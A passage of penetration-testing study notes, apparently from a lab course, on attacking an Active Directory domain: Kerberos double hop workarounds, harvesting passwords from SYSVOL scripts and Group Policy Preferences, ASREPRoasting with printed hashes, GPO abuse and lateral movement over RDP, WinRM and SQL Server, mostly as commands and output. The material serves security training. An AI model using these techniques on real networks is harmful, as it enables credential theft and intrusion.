| select samaccountname \n\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\nException calling \"FindAll\" with \"0\" argument(s): \"An operations error occurred.\n\"\nAt C:\\Users\\backupadm\\Documents\\PowerView.ps1:5253 char:20\n+             else { $Results = $UserSearcher.FindAll() }\n+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : DirectoryServicesCOMException\n</code></pre></p> <p>If we RDP to the same host, open a CMD prompt, and type <code>klist</code>, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.</p> <pre><code>C:\\xyz&gt; klist\n\nCurrent LogonId is 0:0x1e5b8b\n\nCached Tickets: (4)\n\n#0&gt;     Client: backupadm @ legalcorp.local\n        Server: krbtgt/legalcorp.local @ legalcorp.local\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize\n        Start Time: 6/28/2022 9:13:38 (local)\n        End Time:   6/28/2022 19:13:38 (local)\n        Renew Time: 7/5/2022 9:13:38 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n        Cache Flags: 0x2 -&gt; DELEGATION\n        Kdc Called: DC01.legalcorp.local\n\n#1&gt;     Client: backupadm @ legalcorp.local\n        Server: krbtgt/legalcorp.local @ legalcorp.local\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize\n        Start Time: 6/28/2022 9:13:38 (local)\n        End Time:   6/28/2022 19:13:38 (local)\n        Renew Time: 7/5/2022 9:13:38 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n        Cache Flags: 0x1 -&gt; PRIMARY\n        Kdc Called: DC01.legalcorp.local\n\n#2&gt;     Client: backupadm @ legalcorp.local\n        Server: ProtectedStorage/DC01.legalcorp.local @ legalcorp.local\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize\n        Start Time: 6/28/2022 9:13:38 (local)\n        End Time:   6/28/2022 19:13:38 (local)\n        Renew Time: 7/5/2022 9:13:38 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n        Cache Flags: 0\n        Kdc Called: DC01.legalcorp.local\n\n#3&gt;     Client: backupadm @ legalcorp.local\n        Server: cifs/DC01.legalcorp.local @ legalcorp.local\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize\n        Start Time: 6/28/2022 9:13:38 (local)\n        End Time:   6/28/2022 19:13:38 (local)\n        Renew Time: 7/5/2022 9:13:38 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n        Cache Flags: 0\n        Kdc Called: DC01.legalcorp.local\n</code></pre>  Workaround #2: Register PSSession Configuration <p>We've seen what we can do to overcome this problem when using a tool such as <code>evil-winrm</code> to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the Enter-PSSession cmdlet?</p> <pre><code>PS C:\\xyz&gt; Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.legalcorp.local -Credential LEGALCORP\\backupadm\n</code></pre> <p>If we check for cached tickets using <code>klist</code>, we'll see that the same problem exists.</p> <pre><code>[ACADEMY-AEN-DEV01.legalcorp.local]: PS C:\\Users\\backupadm\\Documents&gt; klist\n\nCurrent LogonId is 0:0x11e387\n\nCached Tickets: (1)\n\n#0&gt;     Client: backupadm @ legalcorp.local\n       Server: HTTP/ACADEMY-AEN-DEV01.legalcorp.local @ legalcorp.local\n       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n       Ticket Flags 0x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize\n       Start Time: 6/28/2022 9:09:19 (local)\n       End Time:   6/28/2022 19:09:19 (local)\n       Renew Time: 0\n       Session Key Type: AES-256-CTS-HMAC-SHA1-96\n       Cache Flags: 0x8 -&gt; ASC\n       Kdc Called:\n</code></pre> <p>We also cannot interact directly with the DC using PowerView</p> <pre><code>[ACADEMY-AEN-DEV01.legalcorp.local]: PS C:\\Users\\backupadm\\Documents&gt; Import-Module .\\PowerView.ps1\n[ACADEMY-AEN-DEV01.legalcorp.local]: PS C:\\Users\\backupadm\\Documents&gt; get-domainuser -spn | select samaccountname\n\nException calling \"FindAll\" with \"0\" argument(s): \"An operations error occurred.\n\"\nAt C:\\Users\\backupadm\\Documents\\PowerView.ps1:5253 char:20\n+             else { $Results = $UserSearcher.FindAll() }\n+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n   + FullyQualifiedErrorId : DirectoryServicesCOMException\n</code></pre> <p>One trick we can use here is registering a new session configuration using the Register-PSSessionConfiguration cmdlet.</p> <pre><code>PS C:\\xyz&gt; Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential LEGALCORP\\backupadm\n\n WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce\n a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows\nPowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.\nWARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has\nrecently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be\n required.\nAll WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session\nconfigurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.\n\n   WSManConfig: Microsoft.WSMan.Management\\WSMan::localhost\\Plugin\n\nType            Keys                                Name\n----            ----                                ----\nContainer       {Name=backupadmsess}                backupadmsess\n</code></pre> <p>Once this is done, we need to restart the WinRM service by typing <code>Restart-Service WinRM</code> in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.</p> <p>After we start the session, we can see that the double hop problem has been eliminated, and if we type <code>klist</code>, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the <code>backupadm</code> user and all requests from our local machine will be sent directly to the Domain Controller.</p> <pre><code>PS C:\\xyz&gt; Enter-PSSession -ComputerName DEV01 -Credential LEGALCORP\\backupadm -ConfigurationName  backupadmsess\n[DEV01]: PS C:\\Users\\backupadm\\Documents&gt; klist\n\nCurrent LogonId is 0:0x2239ba\n\nCached Tickets: (1)\n\n#0&gt;     Client: backupadm @ legalcorp.local\n       Server: krbtgt/legalcorp.local @ legalcorp.local\n       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n       Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize\n       Start Time: 6/28/2022 13:24:37 (local)\n       End Time:   6/28/2022 23:24:37 (local)\n       Renew Time: 7/5/2022 13:24:37 (local)\n       Session Key Type: AES-256-CTS-HMAC-SHA1-96\n       Cache Flags: 0x1 -&gt; PRIMARY\n       Kdc Called: DC01\n</code></pre> <p>We can now run tools such as PowerView without having to create a new PSCredential object.</p> <pre><code>[DEV01]: PS C:\\Users\\Public&gt; get-domainuser -spn | select samaccountname\n\nsamaccountname\n--------------\nazureconnect\nbackupjob\nkrbtgt\nmssqlsvc\nsqltest\n</code></pre>  <p>Note: We cannot use <code>Register-PSSessionConfiguration</code> from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like <code>-RunAsCredential $Cred</code>, we will get an error because we can only use <code>RunAs</code> from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console.</p>  <p>We can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user.</p>","title":"Kerberos Double Hop"},{"location":"active_directory/stacking_the_deck/miscellaneous_misconfigurations/","text":"Printer Bug <p>We can use tools such as the <code>Get-SpoolStatus</code> module from this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.</p> <pre><code>PS C:\\xyz&gt; Import-Module .\\SecurityAssessment.ps1\nPS C:\\xyz&gt; Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.legalcorp.local\n\nComputerName                        Status\n------------                        ------\nACADEMY-EA-DC01.legalcorp.local   True\n</code></pre>  Enumerating DNS Records <p>We can use a tool such as adidnsdump to enumerate all DNS records in a domain using a valid domain user account.</p> <pre><code>secops@kali[/kali]$ adidnsdump -u LEGALCORP\\\\forend ldap://172.16.5.5 \n\nPassword: \n\n[-] Connecting to host...\n[-] Binding to host\n[+] Bind OK\n[-] Querying zone for records\n[+] Found 27 records\n</code></pre> <p>It is worth running this tool in larger environments. We may uncover \"hidden\" records that can lead to discovering interesting hosts.</p>  Password in Description Field <pre><code>PS C:\\xyz&gt; Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n\nsamaccountname description\n-------------- -----------\nadministrator  Built-in account for administering the computer/domain\nguest          Built-in account for guest access to the computer/domain\nkrbtgt         Key Distribution Center Service Account\nldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!\n</code></pre>  PASSWD_NOTREQD Field <p>It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute.</p> <pre><code>PS C:\\xyz&gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n\nsamaccountname                                                         useraccountcontrol\n--------------                                                         ------------------\nguest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\nmlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\nehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\n$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT\nnagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT\n</code></pre>  Credentials in SMB Shares and SYSVOL Scripts <p>The SYSVOL share is readable by all authenticated users in the domain. Here, we can see an interesting script named <code>reset_local_admin_pass.vbs</code>.</p> <pre><code>PS C:\\xyz&gt; ls \\\\academy-ea-dc01\\SYSVOL\\legalcorp.local\\scripts\n\n    Directory: \\\\academy-ea-dc01\\SYSVOL\\legalcorp.local\\scripts\n\n\nMode                LastWriteTime         Length Name                                                                 \n----                -------------         ------ ----                                                                 \n-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       \n-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    \n-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     \n-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  \n</code></pre> <p>Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. It would be worth checking to see if this password is still set on any hosts in the domain.</p> <pre><code>PS C:\\xyz&gt; cat \\\\academy-ea-dc01\\SYSVOL\\legalcorp.local\\scripts\\reset_local_admin_pass.vbs\n\nOn Error Resume Next\nstrComputer = \".\"\n\nSet oShell = CreateObject(\"WScript.Shell\") \nsUser = \"Administrator\"\nsPwd = \"!lcorp_L0cALADmin!\"\n\nSet Arg = WScript.Arguments\nIf  Arg.Count &gt; 0 Then\nsPwd = Arg(0) 'Pass the password as parameter to the script\nEnd if\n\n'Get the administrator name\nSet objWMIService = GetObject(\"winmgmts:\\\\\" &amp; strComputer &amp; \"\\root\\cimv2\")\n\n&lt;SNIP&gt;\n</code></pre>  Locating &amp; Retrieving GPP Passwords with CrackMapExec <pre><code>secops@kali[/kali]$ crackmapexec smb -L | grep gpp\n\n[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.\n[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.\n</code></pre> <p>It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy.</p> <pre><code>secops@kali[/kali]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\forend:Klmcargo2 \nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found legalcorp.local/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in legalcorp.local/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['legalcorp.local']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['lcorpguardadmin!']\n</code></pre> <p>We can see that we have retrieved the credentials for an account called <code>guarddesk</code>. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where we can log in as an admin and hunt for additional data.  Whenever we obtain credentials, we should check to see if we can use them to access other hosts, leverage any rights such as interesting ACLs, access shares, or use the password in a password spraying attack to uncover password re-use and maybe an account that grants us further access towards our goal.</p>  ASREPRoasting <p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled.</p> <p>Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.</p> <pre><code>PS C:\\xyz&gt; Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl\n\nsamaccountname     : mmorgan\nuserprincipalname  : mmorgan@legalcorp.local\nuseraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH\n</code></pre> <p>This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.</p> <pre><code>PS C:\\xyz&gt; .\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n[*] Action: AS-REP roasting\n\n[*] Target User            : mmorgan\n[*] Target Domain          : legalcorp.local\n\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.legalcorp.local/DC=LEGALCORP,DC=LOCAL' for '(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'\n[*] SamAccountName         : mmorgan\n[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\n[*] Using domain controller: ACADEMY-EA-DC01.legalcorp.local (172.16.5.5)\n[*] Building AS-REQ (w/o preauth) for: 'legalcorp.local\\mmorgan'\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n     $krb5asrep$23$mmorgan@legalcorp.localn</code></pre> <pre><code>secops@kali[/kali]$ hashcat -m 18200 lcorp_asrep /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n&lt;SNIP&gt;\n</code></pre> <p>When performing user enumeration with <code>Kerbrute</code>, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.</p> <pre><code>secops@kali[/kali]$ kerbrute userenum -d legalcorp.local --dc 172.16.5.5 /opt/jsmith.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop\n\n2022/04/01 13:14:17 &gt;  Using KDC(s):\n2022/04/01 13:14:17 &gt;   172.16.5.5:88\n\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   sbrown@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   jjones@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   tjohnson@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   jwilson@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   bdavis@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   njohnson@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   asanchez@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   dlewis@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   ccruz@legalcorp.local\n2022/04/01 13:14:17 &gt;  [+] mmorgan has no pre auth required. Dumping hash to crack offline:\n$krb5asrep$23$mmorgan@legalcorp.local:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a\n\n&lt;SNIP&gt;\n</code></pre> <p>With a list of valid users, we can use Get-NPUsers.py to search for all users with Kerberoast pre-authentication not required.</p> <pre><code>secops@kali[/kali]$ GetNPUsers.py legalcorp.local/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users \nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[-] User sbrown@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jjones@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User tjohnson@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jwilson@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User bdavis@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User njohnson@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User asanchez@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User dlewis@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ccruz@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$mmorgan@legalcorp.local@legalcorp.local:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9\n[-] User rramirez@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jwallace@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jsantiago@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n\n&lt;SNIP&gt;\n</code></pre>  Group Policy Object (GPO) Abuse <p>GPO misconfigurations can be abused to perform the following attacks:</p> <ul> <li>Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)</li> <li>Adding a local admin user to one or more hosts</li> <li>Creating an immediate scheduled task to perform any number of actions</li> </ul> <p>Using the Get-DomainGPO function from PowerView, we can get a listing of GPOs by name.</p> <pre><code>PS C:\\xyz&gt; Get-DomainGPO |select displayname\n\ndisplayname\n-----------\nDefault Domain Policy\nDefault Domain Controllers Policy\nDeny Control Panel Access\nDisallow LM Hash\nDeny CMD Access\nDisable Forced Restarts\nBlock Removable Media\nDisable Guest Account\nService Accounts Password Policy\nLogon Banner\nDisconnect Idle RDP\nDisable NetBIOS\nAutoLogon\nGuardAutoLogon\nCertificate Services\n</code></pre> <p>If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as <code>Get-GPO</code> to perform the same enumeration.</p> <pre><code>PS C:\\xyz&gt; Get-GPO -All | Select DisplayName\n\nDisplayName\n-----------\nCertificate Services\nDefault Domain Policy\nDisable NetBIOS\nDisable Guest Account\nAutoLogon\nDefault Domain Controllers Policy\nDisconnect Idle RDP\nDisallow LM Hash\nDeny CMD Access\nBlock Removable Media\nGuardAutoLogon\nService Accounts Password Policy\nLogon Banner\nDisable Forced Restarts\nDeny Control Panel Access\n</code></pre> <p>Enumerating Domain User GPO Rights <pre><code>PS C:\\xyz&gt; $sid=Convert-NameToSid \"Domain Users\"\nPS C:\\xyz&gt; Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n\nObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=LEGALCORP,DC=LOCAL\nObjectSID             :\nActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,\n                        WriteOwner\nBinaryLength          : 36\nAceQualifier          : AccessAllowed\nIsCallback            : False\nOpaqueLength          : 0\nAccessMask            : 983095\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513\nAceType               : AccessAllowed\nAceFlags              : ObjectInherit, ContainerInherit\nIsInherited           : False\nInheritanceFlags      : ContainerInherit, ObjectInherit\nPropagationFlags      : None\nAuditFlags            : None\n</code></pre></p> <p>Here we can see that the Domain Users group has various permissions over a GPO, such as <code>WriteProperty</code> and <code>WriteDacl</code>, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with <code>Get-GPO</code> to see the display name of the GPO.</p> <pre><code>PS C:\\xyz Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n\nDisplayName      : Disconnect Idle RDP\nDomainName       : legalcorp.local\nOwner            : LEGALCORP\\Domain Admins\nId               : 7ca9c789-14ce-46e3-a722-83f4097af532\nGpoStatus        : AllSettingsEnabled\nDescription      :\nCreationTime     : 10/28/2021 3:34:07 PM\nModificationTime : 4/5/2022 6:54:25 PM\nUserVersion      : AD Version: 0, SysVol Version: 0\nComputerVersion  : AD Version: 0, SysVol Version: 0\nWmiFilter        :\n</code></pre> <p>Checking in BloodHound, we can see that the <code>Domain Users</code> group has several rights over the <code>Disconnect Idle RDP</code> GPO, which could be leveraged for full control of the object.</p> <p></p> <p>If we select the GPO in BloodHound and scroll down to <code>Affected Objects</code> on the <code>Node Info</code> tab, we can see that this GPO is applied to one OU, which contains four computer objects.</p> <p></p> <p>We could use a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.</p>","title":"Misconfigurations"},{"location":"active_directory/stacking_the_deck/privileged_access/","text":"<p>Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a <code>Pass-the-Hash</code> attack to authenticate via the SMB protocol. <code>But what if we don't yet have local admin rights on any hosts in the domain?</code></p> <p>There are several other ways we can move around a Windows domain.</p>  Remote Desktop <p>Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines.</p> <p>Using PowerView, we could use the Get-NetLocalGroupMember function to begin enumerating members of the <code>Remote Desktop Users</code> group on a given host.</p> <pre><code>PS C:\\xyz&gt; Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"\n\nComputerName : ACADEMY-EA-MS01\nGroupName    : Remote Desktop Users\nMemberName   : LEGALCORP\\Domain Users\nSID          : S-1-5-21-3842939050-3880317879-2865463114-513\nIsGroup      : True\nIsDomain     : UNKNOWN\n</code></pre> <p>Typically first thing to check after importing BloodHound Data:</p> <p>Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?</p> <p>If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under <code>Execution Rights</code> on the <code>Node Info</code> tab.</p> <p>We could also check the <code>Analysis</code> tab and run the pre-built queries <code>Find Workstations where Domain Users can RDP</code> or <code>Find Servers where Domain Users can RDP</code>.</p>  WinRM <p>Enumerating the Remote Management Users Group <pre><code>PS C:\\xyz&gt; Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"\n\nComputerName : ACADEMY-EA-MS01\nGroupName    : Remote Management Users\nMemberName   : LEGALCORP\\forend\nSID          : S-1-5-21-3842939050-3880317879-2865463114-5614\nIsGroup      : False\nIsDomain     : UNKNOWN\n</code></pre></p> <p>We can also utilize this custom <code>Cypher query</code> in BloodHound to hunt for users with this type of access.</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>Establishing WinRM Session from Windows <pre><code>PS C:\\xyz&gt; $password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force\nPS C:\\xyz&gt; $cred = new-object System.Management.Automation.PSCredential (\"LEGALCORP\\forend\", $password)\nPS C:\\xyz&gt; Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred\n\n[ACADEMY-EA-DB01]: PS C:\\Users\\forend\\Documents&gt; hostname\nACADEMY-EA-DB01\n[ACADEMY-EA-DB01]: PS C:\\Users\\forend\\Documents&gt; Exit-PSSession\nPS C:\\xyz&gt; \n</code></pre></p> <p>From a Linux attack host, we can use the tool evil-winrm to connect.</p> <p>From here, we could dig around to plan our next move.</p>  SQL Server Admin <p>In BloodHound we can check for <code>SQL Admin Rights</code> in the <code>Node Info</code> tab for a given user or use this custom Cypher query to search:</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>We can use our ACL rights to authenticate with the <code>wley</code> user, change the password for the <code>damundsen</code> user and then authenticate with the target using a tool such as <code>PowerUpSQL</code>, which has a handy command cheat sheet. Let's assume we changed the account password to <code>SQL1234!</code> using our ACL rights. We can now authenticate and run operating system commands.</p> <p>First, hunt for SQL server instances <pre><code>PS C:\\xyz&gt; cd .\\PowerUpSQL\\\nPS C:\\xyz&gt;  Import-Module .\\PowerUpSQL.ps1\nPS C:\\xyz&gt;  Get-SQLInstanceDomain\n\nComputerName     : ACADEMY-EA-DB01.legalcorp.local\nInstance         : ACADEMY-EA-DB01.legalcorp.local,1433\nDomainAccountSid : 1500000521000170152142291832437223174127203170152400\nDomainAccount    : damundsen\nDomainAccountCn  : Dana Amundsen\nService          : MSSQLSvc\nSpn              : MSSQLSvc/ACADEMY-EA-DB01.legalcorp.local:1433\nLastLogon        : 4/6/2022 11:59 AM\n</code></pre></p> <p>We could then authenticate against the remote SQL server host and run custom queries or operating system commands.</p> <pre><code>PS C:\\xyz&gt;  Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"LEGALCORP\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'\n\nVERBOSE: 172.16.5.150,1433 : Connection Success.\n\nColumn1\n-------\nMicrosoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...\n</code></pre> <p>We can also authenticate from a attack host using mssqlclient.py.</p> <pre><code>secops@kali[/kali]$ mssqlclient.py LEGALCORP/DAMUNDSEN@172.16.5.150 -windows-auth\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old 